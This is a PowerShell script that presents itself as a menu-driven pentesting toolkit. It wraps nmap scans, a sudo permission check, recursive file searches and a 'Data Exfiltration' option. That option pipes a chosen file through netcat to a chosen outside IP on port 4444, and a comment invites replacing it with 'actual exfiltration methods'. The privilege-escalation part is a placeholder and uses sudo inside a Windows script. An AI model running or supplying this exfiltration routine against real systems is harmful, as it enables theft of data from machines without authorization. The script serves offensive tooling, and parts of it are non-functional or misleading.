# PowerShell Pentester Menu Script 
# Menu-driven interface for various pentesting tasks

function Show-Menu {
    Clear-Host
    Write-Host "==========================================="
    Write-Host "      Pentester Tools Menu"
    Write-Host "==========================================="
    Write-Host "1. Reconnaissance"
    Write-Host "2. Enumeration"
    Write-Host "3. Privilege Escalation"
    Write-Host "4. File Searching"
    Write-Host "5. Data Exfiltration"
    Write-Host "6. Exit"
    Write-Host "==========================================="
    Write-Host "Please select an option (1-6):"
}

function Invoke-Reconnaissance {
    Clear-Host
    Write-Host "Starting Reconnaissance..."
    # Example: IP information gathering
    $ip = Read-Host "Enter IP address to gather information"
    Write-Host "Running Nmap scan on IP $ip..."
    nmap -A $ip
    Pause
}

function Invoke-Enumeration {
    Clear-Host
    Write-Host "Starting Enumeration..."
    # Example: Service enumeration on target
    $target = Read-Host "Enter target IP or hostname"
    Write-Host "Enumerating services on $target..."
    nmap -sV $target
    Pause
}

function Invoke-PrivilegeEscalation {
    Clear-Host
    Write-Host "Starting Privilege Escalation Checks..."
    # Example: Check for Sudo permissions or known exploits
    $user = Read-Host "Enter target username for privilege escalation check"
    Write-Host "Checking for sudo permissions for $user..."
    sudo -l
    Write-Host "Searching for known exploits..."
    # This could be more complex, like searching for known vulnerabilities in the system
    # Placeholder for actual privilege escalation task
    Pause
}

function Find-Files {
    Clear-Host
    Write-Host "Starting File Searching..."
    # Example: Search for files with specific extensions or names
    $searchDir = Read-Host "Enter directory to search (e.g., C:\ or /etc)"
    $fileType = Read-Host "Enter file type to search for (e.g., *.txt, *.conf)"
    Write-Host "Searching for $fileType in $searchDir..."
    Get-ChildItem -Path $searchDir -Recurse -Filter $fileType
    Pause
}

function Invoke-Exfiltration {
    Clear-Host
    Write-Host "Starting Data Exfiltration..."
    # Example: Simulate file exfiltration with a netcat or similar tool
    $filePath = Read-Host "Enter the path of the file to exfiltrate"
    $destinationIP = Read-Host "Enter the IP address to exfiltrate data to"
    Write-Host "Exfiltrating file $filePath to $destinationIP..."
    # Example of file transfer (using nc, this should be replaced with actual exfiltration methods)
    cmd /c "nc $destinationIP 4444 < $filePath"
    Write-Host "File exfiltrated successfully."
    Pause
}

# Main Program Loop
do {
    Show-Menu
    $choice = Read-Host "Select an option (1-6)"
    
    switch ($choice) {
        '1' { Invoke-Reconnaissance }
        '2' { Invoke-Enumeration }
        '3' { Invoke-PrivilegeEscalation }
        '4' { Find-Files }
        '5' { Invoke-Exfiltration }
        '6' { Write-Host "Exiting..."; break }
        default { Write-Host "Invalid selection. Please select a valid option (1-6)." }
    }
} while ($choice -ne '6')
